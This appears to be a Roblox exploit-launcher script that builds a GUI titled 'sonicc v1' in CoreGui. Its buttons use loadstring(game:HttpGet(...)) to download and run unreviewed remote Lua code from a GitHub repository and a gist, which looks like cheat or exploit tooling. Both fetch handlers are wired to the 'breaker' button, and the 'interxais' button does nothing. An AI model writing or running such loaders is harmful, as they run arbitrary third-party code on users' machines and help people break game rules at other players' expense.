

local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local label = Instance.new("TextLabel")
local breaker = Instance.new("TextButton")
local nullware = Instance.new("TextButton")
local interxais = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(211, 255, 190)
main.Position = UDim2.new(0.2265625, 0, 0.305315197, 0)
main.Size = UDim2.new(0, 635, 0, 297)
main.Active = true
main.Draggable = true

label.Name = "label"
label.Parent = main
label.BackgroundColor3 = Color3.fromRGB(43, 89, 255)
label.Size = UDim2.new(0, 635, 0, 50)
label.Font = Enum.Font.SourceSans
label.Text = "sonicc v1"
label.TextColor3 = Color3.fromRGB(0, 0, 0)
label.TextSize = 14.000

breaker.Name = "breaker"
breaker.Parent = main
breaker.BackgroundColor3 = Color3.fromRGB(255, 17, 17)
breaker.Position = UDim2.new(0, 0, 0.168350175, 0)
breaker.Size = UDim2.new(0, 313, 0, 118)
breaker.Font = Enum.Font.SourceSans
breaker.Text = "breaker"
breaker.TextColor3 = Color3.fromRGB(0, 0, 0)
breaker.TextSize = 24.000
breaker.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/OmarXploits/Breaker.exe/main/Breaker.exe.lua"),true))()
end)

nullware.Name = "nullware"
nullware.Parent = main
nullware.BackgroundColor3 = Color3.fromRGB(97, 234, 255)
nullware.Position = UDim2.new(0.492913395, 0, 0.168350175, 0)
nullware.Size = UDim2.new(0, 322, 0, 118)
nullware.Font = Enum.Font.SourceSans
nullware.Text = "nullware"
nullware.TextColor3 = Color3.fromRGB(0, 0, 0)
nullware.TextSize = 24.000
breaker.MouseButton1Down:connect(function()
	getgenv().Theme = "Blue" -- To change the UI Theme, set this to one of the following options: "Red", "Purple", "Blue", "Green", "Yellow"
	loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/2d722888a388017c18028cd434c43a25/raw/dcccf1027fe4b90780e47767aaf584389c9d7771/EULma3fU90PUOKUn?identifier=".. (function()local a=""for b=1,256 do local c=math.random(1,3)a=a..string.char(c==1 and math.random(48,57)or c==2 and math.random(97,122)or c==3 and math.random(65,90))end;return a end)()))()
end)


interxais.Name = "interxais"
interxais.Parent = main
interxais.BackgroundColor3 = Color3.fromRGB(255, 161, 161)
interxais.Position = UDim2.new(0, 0, 0.565656543, 0)
interxais.Size = UDim2.new(0, 635, 0, 129)
interxais.Font = Enum.Font.SourceSans
interxais.Text = "interxais"
interxais.TextColor3 = Color3.fromRGB(0, 0, 0)
interxais.TextSize = 24.000
